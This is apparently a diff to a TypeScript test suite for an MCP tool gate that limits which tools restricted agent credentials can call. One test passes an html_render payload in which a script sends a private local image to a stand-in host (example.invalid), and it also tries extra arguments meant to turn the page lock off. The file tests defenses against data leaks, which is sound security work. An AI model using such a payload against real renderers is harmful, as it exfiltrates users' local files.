@@ -46,6 +46,12 @@ const listAllTools = (normal: McpProviderSessionConfig) =>
   promise(async () => (await connectMcp(normal)).listToolNames());
 
 const htmlRenderArgs = { html: "<p>hi</p>", title: "Hi", height: 200 };
+const HTML_TOOLS: ReadonlyArray<string> = ["html_preview", "html_render"];
+
+type ToolResult = {
+  readonly isError?: boolean;
+  readonly content?: ReadonlyArray<{ readonly type: string; readonly text?: string }>;
+};
 
 const withBound = <A, E>(
   squireEnabled: boolean,
@@ -96,15 +102,16 @@ describe("SquireMcpGate on the bound /mcp", () => {
   );
 
   // No `SquireTools` here, so no role tool is served and only the gate shows.
-  it.live("with the switch on, neither a Squire nor the Lead reaches a registered tool", () =>
+  // The page tools pass it and reach the registered ones, which lock a Squire's page too.
+  it.live("with the switch on, a Squire reaches no registered tool but the page tools", () =>
     withBound(true, (bound) =>
       Effect.gen(function* () {
         const all = yield* listAllTools(yield* bound.issueNormal(normalThreadId));
         for (const role of ["lead", "squire"] as const) {
           const config = yield* bound.issueSquire({ threadId: homeThreadId, squireId, role });
           const client = yield* promise(() => connectMcp(config));
-          assert.deepEqual(yield* promise(() => client.listToolNames()), []);
-          for (const name of all) {
+          assert.sameMembers(yield* promise(() => client.listToolNames()), [...HTML_TOOLS]);
+          for (const name of all.filter((name) => !HTML_TOOLS.includes(name))) {
             const { answer } = yield* promise(() => client.callTool(name, {}));
             assert.isTrue(isRefusal(answer), `${role} ${name}: ${JSON.stringify(answer)}`);
           }
@@ -113,8 +120,8 @@ describe("SquireMcpGate on the bound /mcp", () => {
     ),
   );
 
-  // html_render inlines a local image a page names, and the page's scripts can send it on.
-  it.live("keeps the Lead from inlining a local file through html_render", () =>
+  // The ordinary html_render inlines a local image a page names, and its scripts can send it on.
+  it.live("locks a Squire's page whatever the html_render arguments say", () =>
     withBound(true, (bound) =>
       Effect.gen(function* () {
         const fileSystem = yield* FileSystem.FileSystem;
@@ -127,25 +134,31 @@ describe("SquireMcpGate on the bound /mcp", () => {
           new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
         );
         const args = {
-          html: `<script>fetch("https://example.invalid/?d=" + "${privatePath}")</script>`,
+          html: `<img src="${privatePath}"><script>fetch("https://example.invalid/?d=" + document.images[0].src)</script>`,
           title: "Leak",
           height: 200,
         };
-        // An ordinary thread may still publish the page; only Squire credentials lose the tool.
+        // An ordinary thread's page still inlines the image.
         const normalConfig = yield* bound.issueNormal(normalThreadId);
         const ordinary = yield* promise(async () =>
           (await connectMcp(normalConfig)).callTool("html_render", args),
         );
         const ordinaryResult = ordinary.answer?.result as { isError?: boolean } | undefined;
         assert.notEqual(ordinaryResult?.isError, true, JSON.stringify(ordinary.answer));
-        const leadConfig = yield* bound.issueSquire({
-          threadId: homeThreadId,
-          squireId,
-          role: "lead",
-        });
-        const lead = yield* promise(() => connectMcp(leadConfig));
-        const { answer } = yield* promise(() => lead.callTool("html_render", args));
-        assert.isTrue(isRefusal(answer), JSON.stringify(answer));
+        for (const role of ["lead", "squire"] as const) {
+          const config = yield* bound.issueSquire({ threadId: homeThreadId, squireId, role });
+          const client = yield* promise(() => connectMcp(config));
+          // Arguments the tool does not declare cannot switch the lock off.
+          for (const [name, extra] of [
+            ["html_render", { locked: false }],
+            ["html_preview", { locked: false, mode: "standard" }],
+          ] as const) {
+            const { answer } = yield* promise(() => client.callTool(name, { ...args, ...extra }));
+            const result = answer?.result as ToolResult | undefined;
+            assert.isTrue(result?.isError, `${role} ${name}: ${JSON.stringify(answer)}`);
+            assert.include(result?.content?.[0]?.text, privatePath);
+          }
+        }
       }).pipe(Effect.scoped, Effect.provide(NodeServices.layer)),
     ),
   );
@@ -291,9 +304,9 @@ const runScriptedTurn = (message: string) =>
 
 describe("SquireMcpGate through the scripted provider", () => {
   it.live.each([
-    ["lead", "html_render", "failed"],
+    ["lead", "html_render", "completed"],
     ["lead", "lecturn_thread_send", "failed"],
-    ["squire", "html_render", "failed"],
+    ["squire", "html_render", "completed"],
     ["squire", "preview_status", "failed"],
     ["squire", "device_list", "failed"],
     ["squire", "delegate_task", "failed"],
